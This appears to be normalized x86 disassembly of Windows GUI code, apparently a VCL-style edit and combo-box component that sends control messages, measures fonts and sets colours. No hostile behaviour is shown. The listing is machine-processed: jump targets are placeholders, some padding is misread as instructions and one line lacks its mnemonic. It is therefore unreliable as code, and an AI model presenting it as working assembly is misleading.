pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax esi
call sub_4495dc
mov edx 0x19
mov eax esi
call sub_449600
mov dl 0x1
mov eax esi
call sub_450950
xor edx edx
mov eax esi
call sub_449fe4
mov [ esi + 0x20c ] 0x1
mov [ esi + 0x20f ] 0x1
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x211 ] 0x1
mov eax esi
call sub_441e80
mov eax esi
test bl bl
je r-xdata
sub_441818
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_45071c
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_441898
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] esi
mov eax ebx
call sub_450a20
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_4418dc
push ebx
push esi
mov esi eax
mov bl [ esi + 0x215 ]
mov eax esi
call sub_450a20
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_45071c
push eax
call SendMessageA
test eax eax
setne bl
sub_441914
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_450a20
test al al
je r-xdata
mov [ esi + 0x215 ] bl
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0xb9
mov eax esi
call sub_45071c
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_44194c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4419c9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x20d ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4419d0
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov [ ebx + 0x20d ] dl
mov eax ebx
call sub_450a20
test al al
je r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x20d ]
push eax
push 0xcc
mov eax ebx
call sub_45071c
push eax
call SendMessageA
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_449e20
mov eax [ ebp - 0x4 ]
call sub_404410
mov edx eax
mov eax ebx
call sub_449dfc
sub_4419d4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20e ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x20e ] bl
mov eax esi
call sub_450a20
test al al
je r-xdata
push 0x0
xor eax eax
mov al bl
push eax
push 0xcf
mov eax esi
call sub_45071c
push eax
call SendMessageA
sub_441a10
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_45071c
push eax
call SendMessageA
mov eax [ esp ]
pop edx
pop ebx
retn
sub_441a34
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_45071c
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_441a54
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_45071c
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_441a84
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_45071c
push eax
call SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_45071c
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_45071c
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_441b20
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_449d94
inc eax
call sub_408918
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_441baa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_40892c
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_449da4
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
add edx esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40877c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441bb1
mov eax [ ebp - 0xc ]
call sub_408964
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_441bbc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_404040
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
call sub_449d94
inc eax
call sub_408918
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_441c4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40892c
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_449da4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
mov edx [ edi ]
mov ecx esi
call sub_4028d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_408964
retn
sub_441c58
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44d5a8
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44d4d4
mov eax [ esi + 0x4 ]
or eax 0xc0
xor edx edx
mov dl [ ebx + 0x20c ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x20d ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20e ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x213 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x211 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x212 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_441d11
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff74
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_44d8a4
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
je r-xdata
mov esi edx
mov edi esp
mov ecx 0x23
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_44d8a4
mov eax [ ebx + 0x180 ]
test eax eax
je r-xdata
add esp 0x8c
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call SendMessageA
jmp r-xdata
sub_441d84
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x1
xor eax eax
push ebp
push sub_441dc3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44d6d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441dca
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x0
retn
sub_441dca
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x215 ]
mov eax [ ebp - 0x4 ]
call sub_441914
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_441e44
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20d ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call SendMessageA
sub_441e44
push ebx
mov ebx eax
cmp [ ebx + 0x20f ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_441e80
pop ebx
retn
sub_441e80
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_42403c
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_449600
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_441f4c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0x7
jne r-xdata
mov edx ebx
mov eax esi
call sub_44e294
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor eax eax
mov [ ebx + 0x4 ] eax
sub_441f84
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_45071c
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_45071c
push eax
call SendMessageA
sub_441fc4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44fd34
pop esi
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax ebx
call sub_441e44
mov eax ebx
call sub_44dcbc
sub_441ff8
push ebx
mov ebx eax
mov eax ebx
call sub_44fc78
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_441e80
test [ ebx + 0x1c ] 0x1
jne r-xdata
sub_442040
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44fad0
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_45071c
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
mov eax ebx
call sub_441b04
sub_44207c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_450a20
test al al
je r-xdata
mov eax esi
mov si 0xffb3
call sub_403350
push 0xfffffff0
mov eax esi
call sub_45071c
push eax
call GetWindowLongA
test al 0x4
je r-xdata
pop esi
retn
sub_4420b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_4517d8
pop esi
pop ebx
retn
sub_4420ec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_442152
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push edi
push 0x150
mov eax [ ebx + 0x10 ]
call sub_45071c
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442159
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_4199c4
sub_442164
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x151
mov eax [ ebx + 0x10 ]
call sub_45071c
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_442188
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
push 0x0
push edi
push 0x149
mov eax [ ebx + 0x10 ]
call sub_45071c
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax esi
xor edx edx
call sub_40459c
mov edx esi
xchg edx eax
call sub_40459c
mov eax [ esi ]
call sub_404410
push eax
push edi
push 0x148
mov eax [ ebx + 0x10 ]
call sub_45071c
push eax
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4421e0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_442244
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_449e20
push 0x0
push 0x0
push 0x14b
mov eax [ ebx + 0x10 ]
call sub_45071c
push eax
call SendMessageA
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_449e50
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x88 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44224b
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_442250
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x144
mov eax [ ebx + 0x10 ]
call sub_45071c
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_442270
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404410
push eax
push 0xffffffff
push 0x158
mov eax [ ebx + 0x10 ]
call sub_45071c
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_442298
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_45071c
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_44a35c
sub_4422cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44c448
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x91
mov eax ebx
call sub_4495dc
mov edx 0x19
mov eax ebx
call sub_449600
mov dl 0x1
mov eax ebx
call sub_450950
xor edx edx
mov eax ebx
call sub_449fe4
mov dl 0x1
mov eax [ r-xdata ]
call sub_424944
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_4489fc
mov [ ebx + 0x238 ] 0x10
push ebx
push sub_442608
call sub_42205c
mov [ ebx + 0x24c ] eax
push ebx
push sub_442700
call sub_42205c
mov [ ebx + 0x254 ] eax
mov [ ebx + 0x210 ] 0x8
mov [ ebx + 0x214 ] 0xffffffff
mov [ ebx + 0x260 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_4423c0
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax esi
call sub_450a20
test al al
je r-xdata
mov eax [ esi + 0x254 ]
call sub_460994
mov eax [ esi + 0x24c ]
call sub_460994
mov eax [ esi + 0x208 ]
call sub_403154
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44c56c
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_442442
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_44db10
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
xor eax eax
mov [ ebx + 0x248 ] eax
pop ebx
retn
sub_44248c
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x157
mov eax ebx
call sub_45071c
push eax
call SendMessageA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_4424b0
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
push 0x0
xor eax eax
mov al bl
push eax
push 0x14f
mov eax esi
call sub_45071c
push eax
call SendMessageA
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax esi
call sub_45071c
push eax
call InvalidateRect
add esp 0x10
pop esi
pop ebx
retn
sub_4424f8
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
push 0x0
push 0x0
push 0x147
mov eax ebx
call sub_45071c
push eax
call SendMessageA
pop ebx
retn
mov eax [ ebx + 0x214 ]
pop ebx
retn
sub_442524
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
mov [ ebx + 0x214 ] esi
pop esi
pop ebx
retn
pop esi
pop ebx
retn
push 0x0
push esi
push 0x14e
mov eax ebx
call sub_45071c
push eax
call SendMessageA
sub_442570
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x64 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x64 ]
push eax
mov eax esi
call sub_45071c
push eax
call SetWindowTextA
sub_4425ac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_44248c
test al al
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x4
sub_4425e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44fd34
pop esi
pop ebx
retn
mov eax ebx
call sub_44dcbc
sub_442608
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ esi ] 0x112
jne r-xdata
mov eax [ esi ]
cmp eax 0x100
jb r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
jmp r-xdata
mov eax [ ebx + 0x250 ]
push eax
mov edx esi
mov ecx [ ebx + 0x240 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xf4 ]
mov eax [ esi ]
sub eax 0x30
je r-xdata
cmp eax 0x108
ja r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
sub eax 0x1d1
je r-xdata
mov eax ebx
call sub_460ae8
mov edi eax
test edi edi
je r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
sub eax 0x2
jne r-xdata
mov ecx esi
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_449964
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406b44
push eax
push 0x0
push 0x202
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_44a4c8
jmp r-xdata
sub_442720
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4429d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x104
jg r-xdata
cmp eax 0xbd00
jg r-xdata
je r-xdata
sub eax 0xbd02
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x244 ]
je r-xdata
cmp eax 0x87
jg r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
sub eax 0x105
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
mov eax [ ebp + 0x8 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
cmp [ ebx ] 0x203
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44f570
test al al
je r-xdata
sub eax 0x100
je r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44f658
test al al
je r-xdata
sub eax 0xfb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x80
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44248c
test al al
je r-xdata
sub eax 0x7
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46a294
jmp r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_403350
dec eax
je r-xdata
mov [ ebx + 0xc ] 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_460ae8
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_441110
test al al
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44f720
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
je r-xdata
sub eax 0x7c
je r-xdata
movsx eax [ ebx + 0x8 ]
mov [ ebp - 0xc ] eax
movsx eax [ ebx + 0xa ]
mov [ ebp - 0x8 ] eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
push esi
call MapWindowPoints
mov ax [ ebp - 0xc ]
mov [ ebx + 0x8 ] ax
mov ax [ ebp - 0x8 ]
mov [ ebx + 0xa ] ax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov di [ ebx + 0x4 ]
cmp di 0xd
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44248c
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4424b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4429fc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
sub eax 0x5
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub eax 0xfd
je r-xdata
mov eax ebx
call sub_44a590
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
mov edx esi
mov eax ebx
call sub_44e130
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_44f720
test al al
jne r-xdata
add eax 0xffffffd0
sub eax 0x7
jb r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
cmp di 0xd
je r-xdata
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_423b68
push eax
mov eax [ esi + 0x4 ]
push eax
call SetTextColor
mov eax [ ebx + 0x170 ]
call sub_4247ec
call sub_423b68
push eax
mov eax [ esi + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0x170 ]
call sub_424828
mov [ esi + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov edx esi
mov eax ebx
call sub_44e09c
test al al
jne r-xdata
mov eax ebx
call sub_44248c
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
xor edx edx
mov eax ebx
call sub_4424b0
jmp r-xdata
sub_442b0a
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_442c68
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ edx + 0x6 ]
cmp eax 0x8
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442c6f
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
jmp [ eax * 4 + jump_table_442b38 ]
mov eax edi
mov si 0xffe9
call sub_403350
jmp r-xdata
mov eax edi
mov si 0xffb3
call sub_403350
jmp r-xdata
mov [ edi + 0x25d ] 0x0
mov eax edi
mov si 0xffb1
call sub_403350
mov eax edi
mov edx [ eax ]
call [ edx + 0xf0 ]
cmp [ edi + 0x25d ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ edi + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_449e50
mov eax edi
mov si 0xffeb
call sub_403350
mov eax edi
mov si 0xffb2
call sub_403350
jmp r-xdata
mov eax edi
mov si 0xffb0
call sub_403350
jmp r-xdata
mov [ edi + 0x25e ] 0x1
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_44eea0
jmp r-xdata
mov [ edi + 0x25e ] 0x0
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_44ef8c
push 0x0
push 0x0
push 0x1f
mov eax edi
call sub_45071c
push eax
call PostMessageA
cmp [ edi + 0x25e ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x14f
mov eax edi
call sub_45071c
push eax
call PostMessageA
jmp r-xdata
sub_442cbc
push esi
push edi
mov esi eax
mov eax esi
call sub_44bedc
mov edi [ esi + 0x214 ]
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_442ce4
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_450a20
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_442d38
push ebx
push esi
cmp [ eax + 0x222 ] 0x0
je r-xdata
mov si 0xffb3
call sub_403350
